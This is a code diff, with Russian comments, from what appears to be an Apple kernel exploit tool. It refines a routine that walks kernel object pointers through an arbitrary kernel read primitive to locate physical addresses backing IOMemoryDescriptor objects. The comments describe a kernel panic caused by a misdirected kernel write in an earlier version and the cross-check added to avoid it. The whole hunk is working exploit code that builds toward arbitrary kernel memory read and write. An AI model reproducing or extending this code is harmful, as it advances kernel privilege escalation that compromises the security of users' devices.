@@ -5808,27 +5808,44 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         // ID all present). Backing lives in a linked IOMemoryDescriptor —
         // follow every kernel-pointer field of the window one level and hunt a
         // PA-shaped value (0x100xxxxxxxx). Чтения pointee клампимся страницей.
-        kpNote(r, @"  diff пуст — иду по указателям dst-объекта (lvl2) за backing:");
+        // 1.9.103 (паника 081559): lvl2 без перекрёстной проверки принял
+        // константу 0x10122000000 за PA — kwrite ушёл в чужой kalloc.16 объект
+        // (zbound panic, буфер=точно тот адрес). Теперь lvl2 гоняет ОБА
+        // объекта (layout одинаковый) и принимает только РАЗЛИЧАЮЩИЕСЯ PA-пары;
+        // константы (одинаковы у dst и src) отмирают сами.
+        kpNote(r, @"  diff пуст — lvl2: гоняю указатели ОБОИХ объектов, принимаю только различающиеся PA-пары:");
         for (int k = -0x100; k + 8 <= 0x300 && hitOff < 0; k += 8) {
-            int oD = (int)idOffD + k;
-            if (oD < 0 || oD + 8 > 0x4000) continue;
-            uint64_t q = 0;
-            memcpy(&q, pgD + oD, 8);
-            uint64_t u = kp_untag_ptr(q);
-            if (!kpLooksLikeKernelPointer(u)) continue;
-            uint8_t d2[0x100];
+            int oD = (int)idOffD + k, oS = (int)idOffS + k;
+            if (oD < 0 || oS < 0 || oD + 8 > 0x4000 || oS + 8 > 0x4000) continue;
+            uint64_t qD = 0, qS = 0;
+            memcpy(&qD, pgD + oD, 8);
+            memcpy(&qS, pgS + oS, 8);
+            uint64_t uD = kp_untag_ptr(qD), uS = kp_untag_ptr(qS);
+            if (!kpLooksLikeKernelPointer(uD) || !kpLooksLikeKernelPointer(uS)) continue;
+            if (uD == uS) continue;   // разделяемый подобъект — не backing
+            uint8_t d2[0x200], s2[0x200];
             memset(d2, 0, sizeof(d2));
-            uint64_t pageEnd = (u & ~0x3FFFULL) + 0x4000;
-            uint32_t sz2 = (u + sizeof(d2) <= pageEnd) ? (uint32_t)sizeof(d2) : (uint32_t)(pageEnd - u);
-            if (sz2 < 8) continue;
-            if (!kpRead(u, d2, sz2, "lvl2 dump", r)) continue;
+            memset(s2, 0, sizeof(s2));
+            uint64_t endD = (uD & ~0x3FFFULL) + 0x4000;
+            uint64_t endS = (uS & ~0x3FFFULL) + 0x4000;
+            uint32_t szD = (uD + sizeof(d2) <= endD) ? (uint32_t)sizeof(d2) : (uint32_t)(endD - uD);
+            uint32_t szS = (uS + sizeof(s2) <= endS) ? (uint32_t)sizeof(s2) : (uint32_t)(endS - uS);
+            uint32_t sz2 = szD < szS ? szD : szS;
+            if (sz2 < 16) continue;
+            if (!kpRead(uD, d2, sz2, "lvl2 dst", r)) continue;
+            if (!kpRead(uS, s2, sz2, "lvl2 src", r)) continue;
             for (uint32_t o2 = 0; o2 + 8 <= sz2; o2 += 8) {
-                uint64_t q2 = 0;
-                memcpy(&q2, d2 + o2, 8);
-                if (q2 > 0x10000000000ULL && q2 < 0x20000000000ULL) {
-                    kpNote(r, [NSString stringWithFormat:@"    lvl2 [dst ID%+#x → %#llx] +0x%02x: %#018llx ← кандидат backing PA",
-                              k, (unsigned long long)u, o2, (unsigned long long)q2]);
-                    if (hitOff < 0) { hitOff = (int)o2; hitVA = u + o2; dstPAval = q2; }
+                uint64_t qd2 = 0, qs2 = 0;
+                memcpy(&qd2, d2 + o2, 8);
+                memcpy(&qs2, s2 + o2, 8);
+                if (qd2 == qs2) continue;
+                BOOL dPa = (qd2 > 0x10000000000ULL && qd2 < 0x20000000000ULL);
+                BOOL sPa = (qs2 > 0x10000000000ULL && qs2 < 0x20000000000ULL);
+                if (dPa && sPa) {
+                    kpNote(r, [NSString stringWithFormat:@"    lvl2 [ID%+#x: dst→%#llx src→%#llx] +0x%02x: dst=%#018llx src=%#018llx ← ПАРА backing PA",
+                              k, (unsigned long long)uD, (unsigned long long)uS, o2,
+                              (unsigned long long)qd2, (unsigned long long)qs2]);
+                    if (hitOff < 0) { hitOff = (int)o2; hitVA = uD + o2; dstPAval = qd2; srcPAval = qs2; }
                 }
             }
         }
